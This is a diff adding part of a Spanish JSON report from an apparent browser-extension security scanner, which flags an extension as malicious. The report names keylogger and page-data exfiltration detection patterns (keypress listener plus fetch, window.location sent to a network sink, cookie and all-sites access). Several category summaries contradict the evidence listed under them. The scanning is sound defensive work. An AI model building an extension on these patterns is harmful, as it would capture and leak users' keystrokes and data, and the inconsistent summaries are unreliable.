+      ],
+      "preguntas_responde": [
+        "¿Puede interceptar solicitudes web?",
+        "¿Puede modificar respuestas HTTP?",
+        "¿Puede redirigirme a otras páginas?",
+        "¿Puede alterar descargas o recursos cargados?",
+        "¿Puede vigilar mi tráfico de red en todas las páginas?"
+      ]
+    },
+    {
+      "id": "modificacion_paginas",
+      "estado": "capacidad",
+      "titulo": "Modificación de páginas",
+      "resumen": "No vimos señales de que esta extensión modifique páginas web.",
+      "evidencias": [
+        "Combinación relacionada con modificación de páginas en manifest.json:1.",
+        "Posible overlay/UI superpuesta (position fixed/absolute o z-index alto) en manifest.json:1."
+      ],
+      "hallazgos_codigo": [
+        {
+          "line": 1,
+          "texto": "Combinación relacionada con modificación de páginas en manifest.json:1.",
+          "filePath": "manifest.json",
+          "fileType": "manifest"
+        },
+        {
+          "line": 1,
+          "texto": "Posible overlay/UI superpuesta (position fixed/absolute o z-index alto) en manifest.json:1.",
+          "filePath": "manifest.json",
+          "fileType": "manifest"
+        }
+      ],
+      "reglas_activadas": [
+        "page_mod.correlation_dom_script",
+        "page_mod.fake_overlay"
+      ],
+      "preguntas_responde": [
+        "¿Puede modificar el contenido de una página web?",
+        "¿Puede insertar elementos invisibles dentro de sitios?",
+        "¿Puede cambiar botones, formularios o enlaces?",
+        "¿Puede reemplazar anuncios o resultados de búsqueda?",
+        "¿Puede alterar lo que veo en redes sociales o bancos?",
+        "¿Puede superponer interfaces falsas sobre páginas reales?"
+      ]
+    },
+    {
+      "id": "seguimiento_privacidad",
+      "estado": "capacidad",
+      "titulo": "Seguimiento y privacidad",
+      "resumen": "No vimos señales de que esta extensión rastree tu actividad.",
+      "evidencias": [
+        "Puede correlacionar tu actividad en múltiples sitios web distintos.",
+        "Hay envío o movimiento de datos detectado (content.js:368).",
+        "Combinación con envío/contacto de red en content.js:128.",
+        "Combinación con envío/contacto de red en manifest.json:1."
+      ],
+      "hallazgos_codigo": [
+        {
+          "line": 368,
+          "texto": "Hay envío o movimiento de datos detectado (content.js:368).",
+          "filePath": "content.js",
+          "fileType": "content script",
+          "codeSnippet": "const response = await fetch(url);"
+        },
+        {
+          "line": 128,
+          "texto": "Combinación con envío/contacto de red en content.js:128.",
+          "filePath": "content.js",
+          "fileType": "content script"
+        },
+        {
+          "line": 1,
+          "texto": "Combinación con envío/contacto de red en manifest.json:1.",
+          "filePath": "manifest.json",
+          "fileType": "manifest"
+        }
+      ],
+      "reglas_activadas": [
+        "privacy.data_flow",
+        "privacy.network_correlation"
+      ],
+      "preguntas_responde": [
+        "¿Rastrea mi actividad de navegación?",
+        "¿Crea perfiles sobre mis hábitos?",
+        "¿Comparte mis datos con terceros?",
+        "¿Recolecta métricas de uso?",
+        "¿Utiliza analytics ocultos?",
+        "¿Almacena identificadores persistentes?",
+        "¿Puede seguirme entre múltiples sitios web?"
+      ]
+    },
+    {
+      "id": "acceso_general_navegador",
+      "estado": "capacidad",
+      "titulo": "Acceso general al navegador",
+      "resumen": "La extensión tiene permiso para acceder a todas las páginas web, pero no vimos que lo use activamente.",
+      "evidencias": [
+        "Tiene permiso para operar en todos los sitios web que visitas.",
+        "Se ejecuta automáticamente en las páginas que visitas.",
+        "Está configurada para actuar en sitios sensibles: bancos, correo, redes sociales o billeteras digitales.",
+        "No tiene una ventana visible: opera en segundo plano sin que puedas \"apagarla\" directamente.",
+        "Puede abrir nuevas pestañas o redirigirte a otras páginas desde código."
+      ],
+      "hallazgos_codigo": [],
+      "reglas_activadas": [],
+      "preguntas_responde": [
+        "¿Puede ver todas las páginas que visito?",
+        "¿Puede actuar en bancos o correos?",
+        "¿Realmente necesita acceso a todos los sitios web?",
+        "¿Puede ejecutarse automáticamente sin que yo haga clic?"
+      ]
+    },
+    {
+      "id": "abuso_management",
+      "estado": "no_detectado",
+      "titulo": "Abuso de APIs de administración",
+      "resumen": "No se detectó uso de APIs de administración de extensiones.",
+      "evidencias": [],
+      "hallazgos_codigo": [],
+      "reglas_activadas": [],
+      "preguntas_responde": [
+        "¿Puede ver qué otras extensiones tengo instaladas?",
+        "¿Puede desactivar mi bloqueador de anuncios o antivirus?",
+        "¿Puede desinstalarse a sí misma para borrar evidencia?",
+        "¿Puede deshabilitar extensiones de seguridad antes de operar?"
+      ]
+    },
+    {
+      "id": "fingerprinting_severo",
+      "estado": "no_detectado",
+      "titulo": "Fingerprinting severo",
+      "resumen": "No se detectaron técnicas de fingerprinting severo.",
+      "evidencias": [],
+      "hallazgos_codigo": [],
+      "reglas_activadas": [],
+      "preguntas_responde": [
+        "¿Puede identificarme de forma única sin cookies?",
+        "¿Puede rastrearme entre diferentes sitios web?",
+        "¿Crea un perfil permanente de mi dispositivo?",
+        "¿Vende o comparte mi huella digital con terceros?",
+        "¿Viola mi privacidad incluso en modo incógnito?"
+      ]
+    },
+    {
+      "id": "mineria_recursos",
+      "estado": "no_detectado",
+      "titulo": "Minería de recursos / Cryptojacking",
+      "resumen": "No se detectaron señales de minería de recursos.",
+      "evidencias": [],
+      "hallazgos_codigo": [],
+      "reglas_activadas": [],
+      "preguntas_responde": [
+        "¿Puede usar mi CPU para minar criptomonedas?",
+        "¿Puede ralentizar mi computador con cómputo oculto?",
+        "¿Carga código binario externo que no puedo inspeccionar?",
+        "¿Opera en segundo plano cuando no la estoy usando?"
+      ]
+    },
+    {
+      "id": "acceso_historial",
+      "estado": "no_detectado",
+      "titulo": "Historial de navegación",
+      "resumen": "No vimos que esta extensión acceda a tu historial de navegación.",
+      "evidencias": [],
+      "hallazgos_codigo": [],
+      "reglas_activadas": [],
+      "preguntas_responde": [
+        "¿Puede leer mi historial de navegación?",
+        "¿Almacena o transmite las páginas que visito?",
+        "¿Analiza patrones de comportamiento basados en historial?"
+      ]
+    },
+    {
+      "id": "descargas_archivos",
+      "estado": "no_detectado",
+      "titulo": "Descargas y archivos",
+      "resumen": "No vimos permiso fuerte para gestionar descargas.",
+      "evidencias": [],
+      "hallazgos_codigo": [],
+      "reglas_activadas": [],
+      "preguntas_responde": [
+        "¿Puede descargar archivos automáticamente?",
+        "¿Puede generar archivos en mi equipo?",
+        "¿Puede abrir o modificar descargas?",
+        "¿Puede actuar como un downloader de malware?"
+      ]
+    },
+    {
+      "id": "ofuscacion_transparencia",
+      "estado": "no_detectado",
+      "titulo": "Ofuscación y transparencia",
+      "resumen": "No vimos señales fuertes de ofuscación.",
+      "evidencias": [],
+      "hallazgos_codigo": [],
+      "reglas_activadas": [],
+      "preguntas_responde": [
+        "¿El código está ofuscado?",
+        "¿El comportamiento de la extensión es entendible?",
+        "¿Existen partes imposibles de auditar fácilmente?",
+        "¿Usa técnicas anti-debugging?"
+      ]
+    }
+  ],
+  "analysisDuration": 329324,
+  "extensionVersion": "2.5",
+  "analysisTimestamp": "2026-05-19T23:01:33.174Z",
+  "puntuacion_riesgo": {
+    "level": "CRITICAL",
+    "score": 58,
+    "reasons": [
+      "funcion_javascript_riesgosa: t.innerText",
+      "listener_teclado: keypress",
+      "flujo_datos_a_red: window.location viaja hacia network sink fetch (servidor en Internet)",
+      "correlacion_riesgo: keyboard listener (keypress) + network sink in same file — keylogger pattern"
+    ]
+  },
+  "veredicto_usuario": {
+    "nivel": "critico",
+    "razones": [
+      "Keylogging y captura de teclado: La extensión captura lo que escribes y lo envía a un servidor externo — comportamiento de keylogger. Evidencia: Está escuchando lo que escribes en el teclado.",
+      "Lectura de información en páginas: Detectamos que la extensión lee información de las páginas que visitas y la envía a un servidor externo. Evidencia: Información leída de páginas viaja hacia servidores externos."
+    ],
+    "resumen": "Detectamos 2 señal(es) crítica(s): Keylogging y captura de teclado, Lectura de información en páginas; 5 capacidad(es) relevante(s): Contraseñas, tokens y sesiones, Manipulación de tráfico, Modificación de páginas, Seguimiento y privacidad, Acceso general al navegador.",
+    "veredicto": "maliciosa"
+  },
+  "permisos_no_usados": [
+    {
+      "categoria": "low",
+      "permission": "unlimitedStorage",
+      "descripcion": "Permiso \"unlimitedStorage\" declarado en el manifest pero no detectado en el código analizado."
+    }
+  ],
+  "hallazgos_estaticos_positivos": [
+    "En el content script (content.js, línea 368) detectamos que la extensión está enviando información leída desde la página o el navegador hacia una salida de red (window.location -> network sink fetch (servidor en Internet)). Motivo: window.location viaja hacia network sink fetch (servidor en Internet) Contexto: Esto significa que este archivo se inyecta y vive directamente adentro de las páginas web que visitas (como tu correo o tus redes sociales), por lo que puede leer o modificar todo lo que ves y escribes en la pantalla. Confianza: 92%.",
+    "En el content script (content.js, línea 128) detectamos una combinación de señales que aumenta el riesgo: keyboard listener (keypress) + network sink in same file — keylogger pattern. Motivo: varias señales aparecen juntas, lo que aumenta la probabilidad de abuso real. Contexto: Esto significa que este archivo se inyecta y vive directamente adentro de las páginas web que visitas (como tu correo o tus redes sociales), por lo que puede leer o modificar todo lo que ves y escribes en la pantalla. Confianza: 95%.",
+    "En el content script (content.js, línea 368) detectamos una combinación de señales que aumenta el riesgo: AST-detected sensitive-data flow + <all_urls> host access — extension can read & exfiltrate from every site. Motivo: varias señales aparecen juntas, lo que aumenta la probabilidad de abuso real. Contexto: Esto significa que este archivo se inyecta y vive directamente adentro de las páginas web que visitas (como tu correo o tus redes sociales), por lo que puede leer o modificar todo lo que ves y escribes en la pantalla. Confianza: 92%.",
+    "En el manifest (manifest.json, línea 1) detectamos una combinación de señales que aumenta el riesgo: cookies/<all_urls> permission + suspicious external domain + network sink — possible exfiltration path even without observed cookie read. Motivo: varias señales aparecen juntas, lo que aumenta la probabilidad de abuso real. Contexto: Este es el archivo de configuración donde la extensión le pide los permisos iniciales a Chrome. Confianza: 85%.",
+    "En el manifest (manifest.json, línea 1) detectamos una combinación de señales que aumenta el riesgo: extension declares content_scripts on <all_urls>/*://*/* but has no popup, options, sandbox, or override pages — runs invisibly across all browsing. Motivo: varias señales aparecen juntas, lo que aumenta la probabilidad de abuso real. Contexto: Este es el archivo de configuración donde la extensión le pide los permisos iniciales a Chrome. Confianza: 83%.",
+    "En el content script (content.js, línea 128) detectamos un listener de entrada/teclado (keypress); en páginas visitadas puede capturar credenciales o formularios. Motivo: Registers keyboard event listeners Contexto: Esto significa que este archivo se inyecta y vive directamente adentro de las páginas web que visitas (como tu correo o tus redes sociales), por lo que puede leer o modificar todo lo que ves y escribes en la pantalla. Confianza: 97%.",
+    "En el content script (content.js, línea 27) detectamos uso de una función sensible (t.innerText); el riesgo depende de los datos que procesa y del destino. Motivo: Reads page text content Contexto: Esto significa que este archivo se inyecta y vive directamente adentro de las páginas web que visitas (como tu correo o tus redes sociales), por lo que puede leer o modificar todo lo que ves y escribes en la pantalla. Confianza: 80%.",
+    "En el content script (content.js, línea 44) detectamos uso de una función sensible (chrome.storage.local.get); el riesgo depende de los datos que procesa y del destino. Motivo: Uses chrome.storage for local persistence Contexto: Esto significa que este archivo se inyecta y vive directamente adentro de las páginas web que visitas (como tu correo o tus redes sociales), por lo que puede leer o modificar todo lo que ves y escribes en la pantalla. Confianza: 80%. Encontramos 5 ocurrencia(s) similar(es), agrupadas para que el reporte sea legible.",
+    "En el content script (content.js, línea 73) detectamos uso de una función sensible (chrome.storage.local.set); el riesgo depende de los datos que procesa y del destino. Motivo: Uses chrome.storage for local persistence Contexto: Esto significa que este archivo se inyecta y vive directamente adentro de las páginas web que visitas (como tu correo o tus redes sociales), por lo que puede leer o modificar todo lo que ves y escribes en la pantalla. Confianza: 80%. Encontramos 2 ocurrencia(s) similar(es), agrupadas para que el reporte sea legible.",
+    "En el content script (content.js, línea 368) detectamos uso de una función sensible (fetch); el riesgo depende de los datos que procesa y del destino. Motivo: Communicates with external servers Contexto: Esto significa que este archivo se inyecta y vive directamente adentro de las páginas web que visitas (como tu correo o tus redes sociales), por lo que puede leer o modificar todo lo que ves y escribes en la pantalla. Confianza: 80%.",
+    "En el manifest (manifest.json, línea 29) detectamos permiso_chrome_manifest_no_usado (unlimitedStorage). Motivo: el manifest declara un permiso que no vimos usado en código alcanzable. Contexto: Este es el archivo de configuración donde la extensión le pide los permisos iniciales a Chrome. Confianza: 75%."
+  ]
+}
